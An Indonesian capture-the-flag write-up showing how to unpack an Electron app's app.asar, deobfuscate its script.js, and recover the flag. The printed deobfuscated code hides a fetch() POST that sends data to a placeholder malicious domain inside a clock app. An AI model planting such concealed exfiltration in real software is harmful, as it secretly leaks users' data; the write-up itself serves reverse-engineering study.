![Pasted image 20240706012122](https://github.com/adh1ka/ctf-writeup2024/assets/135927661/4fc2a0ca-9539-4289-8512-9f3743d8acd2)

Dari deskripsinya, kita mendapatkan informasi bahwa chall ini berupa client-side web yang dicompile menjadi windows executable. Langsung saja kita kerjakan.

Unzip terlebih dahulu file dengan password yang tersedia yaitu

```
LKS_s3cur3_p4$$w0rdzz$!
```
![Pasted image 20240706012641](https://github.com/adh1ka/ctf-writeup2024/assets/135927661/692e4ab7-e0d3-4f02-a534-e2bc77ead911)

Berikut adalah isinya, terdapat banyak file yang menurut saya agak asing. Terdapat juga 2 folder, di dalam folder resources terdapat file app.asar. Saya coba untuk search di google tentang ‘reverse engineering app.asar’ barangkali menemukan case serupa.

![Pasted image 20240706013037](https://github.com/adh1ka/ctf-writeup2024/assets/135927661/e53640fc-8132-4622-ad4b-1f2180229fc7)

Ternyata, app.asar merupakan electron js, saya pun membuka salah satu dari artikel diatas yaitu https://medium.com/@libaration/decompiling-and-repacking-electron-apps-b9bfbc8390d5.

Dari artikel tersebut, terdapat cara melakukan decompile terhadap app.asar.

![Pasted image 20240706013258](https://github.com/adh1ka/ctf-writeup2024/assets/135927661/cc514de3-89c1-4c18-a441-f8c8c4ba4b69)

```
npx asar extract app.asar <unpackedasar>
```
![Pasted image 20240706013442](https://github.com/adh1ka/ctf-writeup2024/assets/135927661/79dc322b-fe86-484d-8cbf-6d89e5958e81)


Tidak ada yang terlihat mencurigakan di dalam file index.js maupun index.html. Namun di dalam script.js terlihat program yang diobfuscate.

![Pasted image 20240706013719](https://github.com/adh1ka/ctf-writeup2024/assets/135927661/45c30415-e0ca-4fcb-a246-b9a6f85e55e2)

Mari kita lakukan deobfuscate di https://obf-io.deobfuscate.io/.

Berikut hasil decompilenya

```
function getTime() {
  time = new Date().toLocaleTimeString();
  document.body.innerHTML = time;
}
setInterval(getTime, 0x3e8);
var arr = [0x4c, 0xdb, 0xf8, 0x84, 0x99, 0xe9, 0x4b, 0x8e, 0x94, 0x72, 0xbc, 0x36, 0x53, 0x35, 0x3e, 0x4a, 0xcb, 0x59, 0x7b, 0x1, 0x3, 0x48, 0x29, 0x62, 0x6d, 0xac, 0x33, 0x77, 0x16, 0xd6, 0x61, 0x8d, 0xe0, 0xf6, 0xa0, 0xd0, 0x6c, 0x3b, 0x10, 0x31, 0xcb, 0x83, 0x69, 0xdd, 0x3a, 0x9, 0x78, 0x21, 0x63, 0xde, 0x77, 0x1b, 0xdc, 0xb0, 0x69, 0xf7, 0x12, 0x5e, 0xd, 0x2e, 0x30, 0x6c, 0x1, 0x7d, 0xbe, 0x8b, 0x75, 0x82, 0x57, 0xae, 0x30, 0x1d, 0x73, 0x6d, 0x4b, 0x6c, 0x6, 0xcb, 0x5f, 0x4a, 0x26, 0x4, 0xe, 0x29, 0x63, 0xab, 0x21, 0x21, 0xb8, 0xbd, 0x6c, 0x23, 0x56, 0xba, 0x4f, 0xa8, 0x30, 0x85, 0x2a, 0xe7, 0x7b, 0xef, 0x63, 0xe9, 0x0, 0x41, 0xb2, 0x7c, 0x6b, 0xa0, 0x75, 0x14, 0x7d, 0x53, 0x3f, 0x7f, 0x65, 0x7b, 0xb, 0xae, 0x7d, 0xa, 0xd6, 0xff, 0x60, 0x4];
var data = '';
for (var i = 0x0; i < arr.length; i++) {
  if (i % 0x6 == 0x0) {
    data += String.fromCharCode(arr[i]);
  }
}
var flag = {
  'lksflag': data
};
fetch('https://malicious-lksn-surabaya-domain.co.id', {
  'method': 'POST',
  'headers': {
    'Content-Type': "application/json"
  },
  'body': JSON.stringify(flag)
}).then(_0x375525 => {});
```

Dari program tersebut, dapat kita lihat bahwa flag diambil dari ‘data’ yang mana ‘data’ tersebut mengambil dari array ‘arr’. Saya pun mencoba untuk menjalankannya di console browser firefox.
![Pasted image 20240706014318](https://github.com/adh1ka/ctf-writeup2024/assets/135927661/16ebf405-1fea-4c9c-8922-92147550c8a4)



Dan voila, kita dapatkan flagnya yaitu

```
LKS{malici0us_cl0ck?}
```

